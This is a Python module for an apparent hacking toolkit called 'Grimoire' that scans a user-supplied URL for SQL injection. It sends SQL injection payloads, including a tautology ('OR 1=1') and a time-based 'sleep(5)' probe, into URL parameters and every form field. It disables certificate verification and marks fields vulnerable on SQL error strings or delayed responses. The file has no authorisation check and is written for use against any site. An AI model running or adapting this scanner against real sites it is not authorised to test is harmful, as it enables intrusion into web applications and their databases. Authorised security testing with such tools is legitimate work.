import os
import requests
import urllib3
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from main import BaseGrimoireModule, BODY_COLOR, RED, WHITE
except ImportError:
    RED, WHITE, BODY_COLOR = Fore.RED, Fore.WHITE, "\033[38;2;255;219;172m"
    class BaseGrimoireModule:
        def __init__(self, mod_id, name, category):
            self.id, self.name, self.category = mod_id, name, category

class Module(BaseGrimoireModule):
    def __init__(self):
        super().__init__(mod_id="6", name="SQL Vuln Scanner", category="Web-Vuln")
        self.payloads = ["'", "''", "';", '"', "') OR '1'='1", " sleep(5)--"]
        self.sql_errors = ["SQL syntax", "mysql_fetch", "PostgreSQL", "ORA-00933", "SQLite error"]

    def _print_row(self, p, pay, stat, col, c1, c2, c3):
        V = RED + "│"
        p_txt = f" {p}"[:c1-1].ljust(c1)
        l_txt = f" {pay}"[:c2-1].ljust(c2)
        s_txt = f" {stat}"[:c3-1].ljust(c3)
        print(f"{V}{BODY_COLOR}{p_txt}{RED}│{BODY_COLOR}{l_txt}{RED}│{col}{s_txt}{RED}│")

    def run(self):
        print(f"\n{RED}┌──────────────────────────────────────────┐")
        target_url = input(f"{RED}│ {WHITE}URL {RED}> {BODY_COLOR}").strip()
        print(f"{RED}└──────────────────────────────────────────┘")

        if not target_url: return
        if not target_url.startswith(("http://", "https://")):
            target_url = "https://" + target_url

        os.system('cls' if os.name == 'nt' else 'clear')
        
        c1, c2, c3 = 25, 25, 25
        V = RED + "│"

        art = [
            "   ::::::::   ::::::::  :::            ",
            "  :+:    :+: :+:    :+: :+:            ",
            "  +:+        +:+    +:+ +:+            ",
            "  +#++:++#++ +#+    +:+ +#+            ",
            "         #+# +#+  # +#+ +#+            ",
            "  #+#    #+# #+#   +#+  #+#            ",
            "   ########   ###### ## ##########     "
        ]
        for line in art: print(RED + line)

        print(f"\n{RED}[*] {WHITE}SCANNING: {BODY_COLOR}{target_url}\n")

        print(RED + "┌" + "─"*c1 + "┬" + "─"*c2 + "┬" + "─"*c3 + "┐")
        print(V + WHITE + " PARAMETER".ljust(c1) + RED + "│" + WHITE + " PAYLOAD".ljust(c2) + RED + "│" + WHITE + " STATUS".ljust(c3) + V)
        print(RED + "├" + "─"*c1 + "┼" + "─"*c2 + "┼" + "─"*c3 + "┤")

        try:
            res = requests.get(target_url, timeout=10, verify=False)
            soup = BeautifulSoup(res.content, 'html.parser')
            
            parsed = urlparse(target_url)
            if parsed.query:
                for param in parsed.query.split('&'):
                    if '=' in param:
                        p_name = param.split('=')[0]
                        for payload in self.payloads:
                            test_url = target_url.replace(param, f"{p_name}={payload}")
                            self._test(test_url, p_name, payload, c1, c2, c3)
            
            for form in soup.find_all('form'):
                action = form.get('action')
                post_url = urljoin(target_url, action)
                method = form.get('method', 'get').lower()
                for inp in form.find_all(['input', 'textarea']):
                    name = inp.get('name')
                    if not name or inp.get('type') == 'submit': continue
                    for payload in self.payloads:
                        try:
                            data = {name: payload}
                            if method == 'post':
                                r = requests.post(post_url, data=data, timeout=7, verify=False)
                            else:
                                r = requests.get(post_url, params=data, timeout=7, verify=False)
                            self._analyze(r, f"F:{name}", payload, c1, c2, c3)
                        except: pass
        except:
            pass

        print(RED + "└" + "─"*c1 + "┴" + "─"*c2 + "┴" + "─"*c3 + "┘")

    def _test(self, url, name, payload, c1, c2, c3):
        try:
            start = time.time()
            r = requests.get(url, timeout=10, verify=False)
            diff = time.time() - start
            self._analyze(r, name, payload, c1, c2, c3, diff)
        except:
            self._print_row(name, payload, "ERROR", RED, c1, c2, c3)

    def _analyze(self, res, name, payload, c1, c2, c3, exec_time=0):
        if exec_time > 4.5:
            self._print_row(name, payload, "VULNERABLE", Fore.GREEN, c1, c2, c3)
            return

        for err in self.sql_errors:
            if err.lower() in res.text.lower():
                self._print_row(name, payload, "VULNERABLE", Fore.GREEN, c1, c2, c3)
                return
        
        self._print_row(name, payload, "SECURE", RED, c1, c2, c3)